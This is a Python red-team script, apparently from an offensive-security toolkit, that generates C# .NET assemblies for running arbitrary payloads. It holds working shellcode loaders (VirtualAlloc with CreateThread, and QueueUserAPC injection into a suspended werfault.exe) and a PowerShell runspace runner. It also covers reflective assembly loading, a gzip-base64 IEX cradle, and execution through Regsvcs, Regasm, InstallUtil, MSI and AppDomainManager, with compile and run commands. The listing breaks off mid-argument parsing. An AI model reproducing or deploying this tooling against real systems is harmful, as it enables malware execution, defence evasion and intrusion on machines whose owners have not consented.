#!/usr/bin/python3
#
# Red-Teaming script that constructs C# code for Regsvcs/Regasm/InstallUtil code execution technique.
#
# Step 1: Generate source code file
#        cmd> python3 generateRogueDotNet.py -r payload.bin > program.cs
#
# Step 2: Compile library .NET Assembly
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs
#
#   if you passed Powershell code to be launched in a .NET Runspace, then an additional assembly will have to be used
#   to compile resulting source code properly - meaning System.Management.Automation.dll (provided with this script).
#   Then proper compilation command will be:
#
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.Management.Automation.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs
#
# Step 3: Code execution via Regsvcs, Regasm or InstallUtil:
#   x86:
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#   x64:
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#
# Mariusz B. / mgeeky, <mb@binary-offensive.com>
#

import os
import io
import sys
import gzip
import base64
import string
import random
import pefile
import argparse
import tempfile
import subprocess
import textwrap

COMPILER_BASE = '%WINDIR%\\Microsoft.NET\\Framework<ARCH>\\<VER>\\csc.exe'

TYPES_NOT_NEEDING_INPUT_FILE = (
    'run-command', 'exec'
)

COMPILERS = {
    'v2': r'v2.0.50727',
    'v4': r'v4.0.30319',
}

globalOptions = {}

CodeTemplates = {

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'headerComment' : '''
/*
    Author: Casey Smith, Twitter: @subTee
    Customized by: Mariusz B. / mgeeky, <mb@binary-offensive.com>
    License: BSD 3-Clause

    Step 1: Create Your Strong Name Key -> key.snk

        $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
        $Content = [System.Convert]::FromBase64String($key)
        Set-Content key.snk -Value $Content -Encoding Byte

    Step 2: Compile source code:
        %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs

    Step 3: Execute your payload!
        %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
        %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 

        %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe rogue.dll
        %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U rogue.dll

        %WINDIR%\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#       %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
*/
''',
    
    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'decompressionFuncs': '''
        public static long CopyTo(Stream source, Stream destination) {
            byte[] buffer = new byte[2048];
            int bytesRead;
            long totalBytes = 0;
            while((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0) {
                destination.Write(buffer, 0, bytesRead);
                totalBytes += bytesRead;
            }
            return totalBytes;
        }

        public static byte[] DecompressString(string compressedText) {
            byte[] data = Convert.FromBase64String(compressedText);

            using (MemoryStream ms = new MemoryStream(data)) {
                using (GZipStream gzip = new GZipStream(ms, CompressionMode.Decompress)) {
                    using (MemoryStream decompressed = new MemoryStream()) {
                        //gzip.CopyTo(decompressed);
                        CopyTo(gzip, decompressed);
                        return decompressed.ToArray();
                    }
                }
            }
        }
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'exeLaunchStub' : '''

        $decompressionFuncs

        public static bool Execute() {

            string shellcode = "";
            $payloadCode
            byte[] payload = DecompressString(shellcode);

            Assembly asm = Assembly.Load(payload);
            MethodInfo method = asm.EntryPoint;
            object instance = asm.CreateInstance(method.Name);
            method.Invoke(instance, new object[] { new string[] { } }); 
            return true;
        }
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'inlineShellcodeLoader' : '''
        
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId );

        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds );

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_RELEASE = 0x8000;

        $decompressionFuncs

        public static bool Execute() {

            string shellcode = "";
            $payloadCode
            byte[] payload = DecompressString(shellcode);

            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(payload, 0, funcAddr, payload.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            CloseHandle(hThread);
            VirtualFree(funcAddr, 0, MEM_RELEASE);

            return true;
        }                                           
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'queueUserAPCShellcodeLoader' : '''

        $decompressionFuncs

        public static bool Execute() {

            string shellcode = "";
            $payloadCode
            byte[] payload = DecompressString(shellcode);
              
            string processpath = Environment.ExpandEnvironmentVariables(@"$targetProcess");
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool success = CreateProcess(null, processpath, 
            IntPtr.Zero, IntPtr.Zero, false, 
            ProcessCreationFlags.CREATE_SUSPENDED, 
            IntPtr.Zero, null, ref si, out pi);

            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, payload.Length,MEM_COMMIT, PAGE_READWRITE);
            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,payload,payload.Length, out bytesWritten);

            IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
            uint oldProtect = 0;
            resultBool = VirtualProtectEx(pi.hProcess,resultPtr, payload.Length,PAGE_EXECUTE_READ, out oldProtect);
            IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);

            IntPtr ThreadHandle = pi.hThread;
            ResumeThread(ThreadHandle);
            return true;
        }
        
        private static UInt32 MEM_COMMIT = 0x1000;
       
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;
        
        [Flags]
        public enum ProcessAccessFlags : uint
        {
          All = 0x001F0FFF,
          Terminate = 0x00000001,
          CreateThread = 0x00000002,
          VirtualMemoryOperation = 0x00000008,
          VirtualMemoryRead = 0x00000010,
          VirtualMemoryWrite = 0x00000020,
          DuplicateHandle = 0x00000040,
          CreateProcess = 0x000000080,
          SetQuota = 0x00000100,
          SetInformation = 0x00000200,
          QueryInformation = 0x00000400,
          QueryLimitedInformation = 0x00001000,
          Synchronize = 0x00100000
        }
        
        [Flags]
        public enum ProcessCreationFlags : uint
        {
          ZERO_FLAG = 0x00000000,
          CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
          CREATE_DEFAULT_ERROR_MODE = 0x04000000,
          CREATE_NEW_CONSOLE = 0x00000010,
          CREATE_NEW_PROCESS_GROUP = 0x00000200,
          CREATE_NO_WINDOW = 0x08000000,
          CREATE_PROTECTED_PROCESS = 0x00040000,
          CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
          CREATE_SEPARATE_WOW_VDM = 0x00001000,
          CREATE_SHARED_WOW_VDM = 0x00001000,
          CREATE_SUSPENDED = 0x00000004,
          CREATE_UNICODE_ENVIRONMENT = 0x00000400,
          DEBUG_ONLY_THIS_PROCESS = 0x00000002,
          DEBUG_PROCESS = 0x00000001,
          DETACHED_PROCESS = 0x00000008,
          EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
          INHERIT_PARENT_AFFINITY = 0x00010000
        }

        public struct PROCESS_INFORMATION
        {
          public IntPtr hProcess;
          public IntPtr hThread;
          public uint dwProcessId;
          public uint dwThreadId;
        }

        public struct STARTUPINFO
        {
          public uint cb;
          public string lpReserved;
          public string lpDesktop;
          public string lpTitle;
          public uint dwX;
          public uint dwY;
          public uint dwXSize;
          public uint dwYSize;
          public uint dwXCountChars;
          public uint dwYCountChars;
          public uint dwFillAttribute;
          public uint dwFlags;
          public short wShowWindow;
          public short cbReserved2;
          public IntPtr lpReserved2;
          public IntPtr hStdInput;
          public IntPtr hStdOutput;
          public IntPtr hStdError;
        }
        
        [Flags]
        public enum    ThreadAccess : int
        {
          TERMINATE           = (0x0001)  ,
          SUSPEND_RESUME      = (0x0002)  ,
          GET_CONTEXT         = (0x0008)  ,
          SET_CONTEXT         = (0x0010)  ,
          SET_INFORMATION     = (0x0020)  ,
          QUERY_INFORMATION       = (0x0040)  ,
          SET_THREAD_TOKEN    = (0x0080)  ,
          IMPERSONATE         = (0x0100)  ,
          DIRECT_IMPERSONATION    = (0x0200)
        }
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
          int dwThreadId);
        
        [DllImport("kernel32.dll",SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,
          IntPtr lpBaseAddress,
          byte[] lpBuffer,
          int nSize,
          out IntPtr lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
           Int32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true )]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
         ProcessAccessFlags processAccess,
         bool bInheritHandle,
         int processId
        );
        
         [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
                     bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
                    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern uint SuspendThread(IntPtr hThread);
        
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
        int dwSize, uint flNewProtect, out uint lpflOldProtect);
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'powershellRunspaceRunner' : '''
        $decompressionFuncs

        public static bool Execute() {

            string shellcode = "$payloadCode";
            byte[] payload = DecompressString(shellcode);
            string decoded = System.Text.Encoding.UTF8.GetString(payload);

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(decoded);
            pipeline.Invoke();

            runspace.Close();
            return true;
        }      
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'registerClassAdditions' : '''

        // This executes if registration is successful
        [ComRegisterFunction]
        public static void RegisterClass( string key )
        {
            Execute();
        }
        
        // This executes if registration fails
        [ComUnregisterFunction]
        public static void UnRegisterClass( string key )
        {
            Execute();
        }
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'forInstallUtilAdditions' : '''

    [System.ComponentModel.RunInstaller(true)]
    public class ForInstallUtil : System.Configuration.Install.Installer
    {
        // This executes during InstallUtil /U invocation
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            $templateName.Execute();
        }
    }
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'executeHardcodedCommandCode' : '''

      public static bool Execute() {
          string fullPath = @"<CMD>";

          if(String.IsNullOrEmpty(fullPath)) {
              return false;
          }

          ProcessStartInfo psi = new ProcessStartInfo();
          psi.FileName = Path.GetFileName(fullPath);
          psi.WorkingDirectory = Path.GetDirectoryName(fullPath);

          string args = "";
          if(fullPath[0] == '"')
          {
              int pos = fullPath.IndexOf("\\"", 1);
              if(pos != -1)
              {
                  psi.FileName = Path.GetFileName(fullPath.Substring(1, pos));
                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1, pos));

                  if (pos + 2 < fullPath.Length && fullPath[pos + 2] == ' ') 
                  {
                      args = fullPath.Substring(pos + 2);
                  }
              }
              else
              {
                  psi.FileName = Path.GetFileName(fullPath.Substring(1));
                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1));
              }
          }
          else if(fullPath.IndexOf(" ") == -1 && fullPath.IndexOf("\\\\") == -1)
          {
              Process.Start(fullPath);
              return true;
          }
          else 
          {
              int pos = fullPath.IndexOf(" ");
              if (pos != -1)
              {
                  psi.FileName = Path.GetFileName(fullPath.Substring(0, pos));
                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(0, pos));

                  if (pos + 1 < fullPath.Length)
                  {
                      args = fullPath.Substring(pos + 1);
                  }
              }
          }

          psi.Arguments = args;
          Process.Start(psi);

          return true;
      }
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'executeCommandFromParamCode' : '''

      public static bool Execute() {
          return true;
      }

      public static bool Execute(string command) {
          if(String.IsNullOrEmpty(command)) {
            return false;
          }

          string fullPath = command;
          ProcessStartInfo psi = new ProcessStartInfo();
          psi.FileName = Path.GetFileName(fullPath);
          psi.WorkingDirectory = Path.GetDirectoryName(fullPath);

          string args = "";
          if(fullPath[0] == '"')
          {
              int pos = fullPath.IndexOf("\\"", 1);
              if(pos != -1)
              {
                  psi.FileName = Path.GetFileName(fullPath.Substring(1, pos));
                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1, pos));

                  if (pos + 2 < fullPath.Length && fullPath[pos + 2] == ' ') 
                  {
                      args = fullPath.Substring(pos + 2);
                  }
              }
              else
              {
                  psi.FileName = Path.GetFileName(fullPath.Substring(1));
                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1));
              }
          }
          else if(fullPath.IndexOf(" ") == -1 && fullPath.IndexOf("\\\\") == -1)
          {
              Process.Start(fullPath);
              return true;
          }
          else 
          {
              int pos = fullPath.IndexOf(" ");
              if (pos != -1)
              {
                  psi.FileName = Path.GetFileName(fullPath.Substring(0, pos));
                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(0, pos));

                  if (pos + 1 < fullPath.Length)
                  {
                      args = fullPath.Substring(pos + 1);
                  }
              }
          }

          psi.Arguments = args;
          Process.Start(psi);

          return true;
      }
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'appDomainManagerCode' : '''

    public sealed class MyAppDomainManager : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            $namespaceName.$templateName.Execute();
            return;
        }
    }
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================

    'codeBoilerplate' : '''
$assemblyAdditions1

using System.Management.Automation;
using System.Management.Automation.Runspaces;
using Microsoft.Build.Framework;
using System;
using System.Diagnostics;
using System.Reflection;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;
using System.Text;
$msiUsing

$extraCodeOutsideOfNamespace

$namespaceStart

    $extraCodeWithinNamespace
  
    [ComVisible(true)]
    public class $templateName $assemblyAdditions4
    {
        public $templateName() 
        { 
            Execute();
        }

        $method
        {
            Execute($runCommand);
            $msiReturn
        }

        $assemblyAdditions2

        $launchCode           
    }

    $assemblyAdditions3

$namespaceStop
''',

    #======================================================================================================
    #======================================================================================================
    #======================================================================================================
}

class ShellCommandReturnedError(Exception):
    pass

def shell2(cmd, alternative=False, stdErrToStdout=False, surpressStderr=False):
    CREATE_NO_WINDOW = 0x08000000
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE

    outs = ''
    errs = ''
    if not alternative:
        out = subprocess.run(
            cmd,
            cwd = os.path.dirname(os.path.abspath(__file__)),
            shell=True,
            capture_output=True,
            startupinfo=si,
            creationflags=CREATE_NO_WINDOW,
            timeout=60,
            check = False
        )

        outs = out.stdout
        errs = out.stderr

    else:
        proc = subprocess.Popen(
            cmd,
            cwd = os.path.dirname(os.path.abspath(__file__)),
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            startupinfo=si,
            creationflags=CREATE_NO_WINDOW
        )
        try:
            outs, errs = proc.communicate(timeout=60)
            proc.wait()

        except subprocess.TimeoutExpired:
            proc.kill()
            sys.stderr.write('WARNING! The command timed-out! Results may be incomplete\n')
            outs, errs = proc.communicate()

    status = outs.decode(errors='ignore').strip()

    if len(errs) > 0 and not surpressStderr:
        error = '''
Running shell command ({}) failed:

------------------------------------------------------------------------------------------------------------------------
{}
------------------------------------------------------------------------------------------------------------------------
'''.format(cmd, errs.decode(errors='ignore'))

        if stdErrToStdout:
            return error

        raise ShellCommandReturnedError(error)

    return status

def shell(cmd, alternative=False, output=False, surpressStderr=False):
    out = shell2(cmd, alternative, stdErrToStdout=output, surpressStderr=surpressStderr)
    return out

def getCompressedPayload(filePath, returnRaw=False):
    out = io.BytesIO()
    encoded = ''
    with open(filePath, 'rb') as f:
        inp = f.read()

        with gzip.GzipFile(fileobj=out, mode='w') as fo:
            fo.write(inp)

        encoded = base64.b64encode(out.getvalue())
        if returnRaw:
            return encoded

    powershell = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();".format(
        encoded.decode(errors='ignore')
    )
    return powershell

def getPayloadCode(payload):
    return f'shellcode = "{payload}";'

#    payloadCode = '\n'
#
#    N = 50000
#    codeSlices = map(lambda i: payload[i:i + N], range(0, len(payload), N))
#
#    variables = []
#
#    num = 1
#    for code in codeSlices:
#        payloadCode += f'string shellcode{num} = "{code}";\n'
#        variables.append(f'shellcode{num}')
#        num += 1
#
#    concat = 'shellcode = ' + ' + '.join(variables) + ';\n'
#    payloadCode += concat
#
#    return payloadCode

def getSourceFileContents(
    module,
    namespace,
    method,
    payload,
    _format,
    apc,
    targetProcess,
    dontUseNamespace=False,
    _type='regasm',
    command=''
):

    templateName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
    if len(module) > 0:
        templateName = module

    namespaceName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
    if len(namespace) > 0:
        namespaceName = namespace

    methodName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
    if len(method) > 0:
        methodName = method

    payloadCode = payload

    if _type not in ['exec', 'run-command']:
        if type(payload) is str:
            payload = payload.encode()
        payloadCode = getPayloadCode(payload.decode(errors='ignore'))

    launchCode = ''

    if _type not in ['exec', 'run-command']:
        if _format == 'exe':
            exeLaunchCode = string.Template(CodeTemplates['exeLaunchStub']).safe_substitute(
                decompressionFuncs=CodeTemplates['decompressionFuncs'],
                payloadCode=payloadCode
            )

            launchCode = exeLaunchCode

        elif _format == 'raw':
            if not apc:
                shellcodeLoader = string.Template(CodeTemplates['inlineShellcodeLoader']).safe_substitute(
                    decompressionFuncs=CodeTemplates['decompressionFuncs'],
                    payloadCode=payloadCode
                )
            else:
                shellcodeLoader = string.Template(CodeTemplates['queueUserAPCShellcodeLoader']).safe_substitute(
                    decompressionFuncs=CodeTemplates['decompressionFuncs'],
                    templateName=templateName,
                    payloadCode=payloadCode,
                    targetProcess=targetProcess
                )

            launchCode = shellcodeLoader

        else:
            if type(payload) is bytes:
                payload = payload.decode(errors='ignore')

            powershellLaunchCode = string.Template(CodeTemplates['powershellRunspaceRunner']).safe_substitute(
                decompressionFuncs=CodeTemplates['decompressionFuncs'],
                payloadCode=base64.b64encode(payload.encode()).decode(errors='ignore')
            )

            launchCode = powershellLaunchCode

    namespaceStart = 'namespace ' + namespaceName + ' {'
    namespaceStop = '}'

    if dontUseNamespace:
        namespaceStart = namespaceStop = ''

    assemblyAdditions1 = CodeTemplates['headerComment']
    assemblyAdditions2 = CodeTemplates['registerClassAdditions']
    assemblyAdditions3 = string.Template(CodeTemplates['forInstallUtilAdditions']).safe_substitute(templateName=templateName)
    assemblyAdditions4 = ' : ServicedComponent'

    if _type != 'regasm':
        assemblyAdditions1 = assemblyAdditions2 = ''
        assemblyAdditions3 = assemblyAdditions4 = ''

    if _type == 'exec':
        launchCode = CodeTemplates['executeHardcodedCommandCode'].replace('<CMD>', payloadCode)

    elif _type == 'run-command':
        launchCode = CodeTemplates['executeCommandFromParamCode'].replace('<CMD>', payloadCode)

    method = f'public void {methodName}(string command)'
    msiUsing = ''
    msiReturn = ''
    extraCodeOutsideOfNamespace = ''
    extraCodeWithinNamespace = ''

    if globalOptions['msi_mode']:
        msiUsing = 'using Microsoft.Deployment.WindowsInstaller;'
        msiReturn = 'return ActionResult.Success;'
        method = f'''[CustomAction]
        public static ActionResult {methodName}(Session session)'''

    elif globalOptions['appdomainmanager_mode']:
        extraCodeOutsideOfNamespace = string.Template(CodeTemplates['appDomainManagerCode']).safe_substitute(
            templateName=templateName,
            namespaceName=namespaceName
        )

    template = string.Template(CodeTemplates['codeBoilerplate']).safe_substitute(
        namespaceStart=namespaceStart,
        launchCode=launchCode,
        templateName=templateName,
        assemblyAdditions1=assemblyAdditions1,
        assemblyAdditions2=assemblyAdditions2,
        assemblyAdditions3=assemblyAdditions3,
        assemblyAdditions4=assemblyAdditions4,
        runCommand='command' if _type == 'run-command' else '',
        method=method,
        msiReturn=msiReturn,
        msiUsing=msiUsing,
        namespaceStop=namespaceStop,
        extraCodeWithinNamespace=extraCodeWithinNamespace,
        extraCodeOutsideOfNamespace=extraCodeOutsideOfNamespace,
    )

    return template, templateName


def detectFileIsExe(filePath, forced=False):
    try:
        pe = pefile.PE(filePath)
        return True
    except pefile.PEFormatError as e:
        return False


def opts(argv):

    epilog = f'''
------------------------------------------------------------------------------------------------------------------------
USE CASES:

1) Generate .NET EXE assembly that injects shellcode into remote process and runs via QueueUserAPC:
    cmd> py generateRogueDotNet.py calc64.bin -o evil.exe --queue-apc

2) Generate .NET DLL assembly that executes shellcode inline/in-process
    cmd> py generateRogueDotNet.py calc64.bin -o evil.dll

3) Generate .NET v4 DLL assembly that executes shellcode in-process and will be used for building evil MSI:
    cmd> py generateRogueDotNet.py calc64.bin -o evil.dll --dotnet-ver v4 -M

4) Run Powershell through a managed runspace:
    cmd> py generateRogueDotNet.py evil.ps1 -o evil.exe --dotnet-ver v4

5) Generate .NET DLL assembly that runs shellcode and can be loaded with Regasm/Regsvcs/InstallUtil LOLBINs:
    cmd> py generateRogueDotNet.py calc64.bin -o evil.dll -t regasm

5) Generate .NET assembly that executes hardcoded system command (calc.exe):
    cmd> py generateRogueDotNet.py -o evil.dll -t exec calc.exe

6) Generate .NET v4 DLL assembly that executes shellcode in-process and will be used for AppDomainManager injection (aka TheWover/GhostLoader):
    cmd> py generateRogueDotNet.py calc64.bin -o evil.dll --dotnet-ver v4 -A

------------------------------------------------------------------------------------------------------------------------
    '''

    parser = argparse.ArgumentParser(
        prog=argv[0], 
        usage='%(prog)s [options] <inputFile|cmdline>',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(epilog)
    )
    
    parser.add_argument('inputFile', help='Input file to embedded into C# source code for --type regasm|plain. If --type exec was given, this parameter specifies command line to execute by the resulting assembly (environment variables will get expanded). May be either Powershell script, raw binary Shellcode or .NET Assembly (PE/EXE) file.')

    parser.add_argument('-t', '--type', choices=['regasm', 'plain', 'exec', 'run-command'], default='plain', help='Specifies type of payload to generate. "plain" - assembly with embedded shellcode/ps1/exe, "exec" - assembly that hardcodes supplied shell command in "inputFile|cmdline" parameter and then runs it, "run-command" exposes a method named --method which takes one string parameter being a command to run, "regasm" - produces executable compatible with Regasm/Regsvcs/InstallUtil code execution primitives. Default: plain')

    parser.add_argument('-d', '--debug', action='store_true', help='Debug mode')
    parser.add_argument('-c', '--compile', choices=['default', 'x86', 'x64'], default='default',
                        help='Compile the source code using x86 or x64 csc.exe and generate output EXE/DLL file depending on --output extension. Default: default - CPU independent executable will be produced.')
    parser.add_argument('-o', '--output', metavar='PATH', default='', type=str,
                        help='Output path where to write produced assembly/C# code. Default: print resulting C# code to stdout')
    parser.add_argument('-s', '--namespace', metavar='NAME', default='ProgramNamespace', type=str,
                        help='Specifies custom C# module namespace for the generated Task (for needs of shellcode loaders such as DotNetToJScript or Donut). Default: ProgramNamespace.')
    parser.add_argument('-n', '--module', metavar='NAME', default='Program', type=str,
                        help='Specifies custom C# module name for the generated Task (for needs of shellcode loaders such as DotNetToJScript or Donut). Default: Program.')
    parser.add_argument('-m', '--method', metavar='NAME', default='Foo', type=str,
                        help='Specifies method name that could be used by DotNetToJS and alike deserialization techniques to invoke our shellcode. Default: Foo')
    parser.add_argument('-e', '--exe', action='store_true',
                        help='Specified input file is an Mono/.Net assembly PE/EXE. WARNING: Launching EXE is currently possible ONLY WITH MONO/.NET assembly EXE/DLL files, not an ordinary native PE/EXE!')
    parser.add_argument('-r', '--raw', action='store_true',
                        help='(OBSOLETED) Specified input file is a raw Shellcode to be injected in self process in a separate Thread (VirtualAlloc + CreateThread)')
    parser.add_argument('-M', '--msi-mode', action='store_true',
                        help='Compiled .NET assembly is to be used with MSI installer')
    parser.add_argument('-A', '--appdomainmanager-mode', action='store_true',
                        help='Defines additional public sealed class inheriting from AppDomainManager with name: "MyAppDomainManager". Useful for side-loading .NET applications through the AppDomainManager Injection attack (google up: TheWover/GhostLoader)')
    parser.add_argument('-C', '--extra-params', metavar='PARAMS', default='',
                        help='Additional parameters to add to CSC compiler')
    parser.add_argument('--dotnet-ver', choices=['v2', 'v4', '2', '4'], default='v2',
                        help='Use specific .NET version for compilation (with --compile given). Default: v2')
    parser.add_argument('--queue-apc', action='store_true',
                        help='If --raw was specified, generate C# code template with CreateProcess + WriteProcessMemory + QueueUserAPC process injection technique instead of default CreateThread.')
    parser.add_argument('--target-process', metavar='PATH', default=r'%windir%\system32\werfault.exe',
